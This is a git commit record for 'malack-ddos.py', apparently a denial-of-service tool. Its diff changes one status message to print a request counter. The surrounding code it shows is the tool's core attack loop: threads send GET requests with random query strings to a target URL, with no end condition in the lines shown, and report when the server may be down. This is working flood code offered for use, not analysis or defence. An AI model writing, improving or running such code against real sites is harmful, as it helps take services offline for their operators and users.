dd7c6f53dd3973ad3aee8ab62466947a258a0fe3
abatatsa99 <abatatsa311@gmail.com>
2025-09-19 00:17:55 +0700

    Update malack-ddos.py

--- malack-ddos.py
+++ malack-ddos.py
@@ -70,8 +70,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[⟨⟩]\033[31m▒\033[31m " +str()+ "▒\033[37m Request Sent ▒\033[33m " +url+ "▒=⟩\033[0m" )  
-                print("[⟨⟩]\033[31m▒\033[32m " +str()+ "▒\033[4m Request Send \033[1m▒\033[33m " +url+ "▒=⟩\033[0m" )      
+                print("[⟨⟩]\033[31m▒\033[31m " +str(u)+ "▒\033[37m Request Sent ▒\033[33m " +url+ "▒=⟩\033[0m" )      
             except requests.exceptions.ConnectionError:
                 print("▒ ▒ ▒ \033[1mServer \033[4mMaybe\033[97m ▒ ▒ ▒ \033[35mDown ▒ ▒ \033[0m" )
                 pass
